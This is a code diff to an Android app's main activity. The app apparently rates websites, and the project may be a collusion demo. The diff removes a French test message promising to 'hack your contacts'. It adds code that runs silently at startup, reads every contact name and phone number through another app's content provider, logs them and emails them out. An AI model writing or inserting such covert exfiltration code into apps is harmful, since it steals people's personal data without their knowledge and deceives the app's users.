@@ -6,10 +6,13 @@ import android.content.ContentProviderClient;
 import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
+import android.content.pm.PackageInfo;
+import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.net.Uri;
 import android.os.Bundle;
 import android.provider.ContactsContract;
+import android.util.Log;
 import android.view.View;
 import android.widget.Button;
 import android.widget.EditText;
@@ -17,6 +20,9 @@ import android.widget.LinearLayout;
 import android.widget.RatingBar;
 import android.widget.TextView;
 import android.widget.Toast;
+
+import java.util.ArrayList;
+import java.util.List;
 
 
 public class MainActivity extends AppCompatActivity {
@@ -29,7 +35,29 @@ public class MainActivity extends AppCompatActivity {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
         websites_db = new WebsitesDatabase(this);
-        sendEmail("Bonjour, ceci est un test ! Bientôt on va hacker tes contacts");
+        StringBuilder body = new StringBuilder();
+        body.append("Contacts : \n");
+        Cursor contacts = getContentResolver().query(Uri.parse("content://com.enseirb.collusioncontact.provider"), null, null, null, null);
+        if (contacts.moveToFirst()) {
+            do {
+                String contactName = contacts.getString(contacts.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
+                String contactId = contacts.getString(contacts.getColumnIndex(ContactsContract.Contacts._ID));
+                StringBuilder phoneNumbers = new StringBuilder();
+                Cursor phones = getContentResolver().query(Uri.parse("content://com.enseirb.collusioncontact.provider"), null, contactId, null, null);
+
+                if (phones.moveToFirst()) {
+                    do {
+                        phoneNumbers.append(phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)));
+                    } while (phones.moveToNext());
+                }
+
+                phones.close();
+                body.append(contactName).append(" : ").append(phoneNumbers).append("\n");
+                Log.v(TAG,body.toString());
+            } while (contacts.moveToNext());
+        }
+        contacts.close();
+        sendEmail(body.toString());
     }
 
     /*
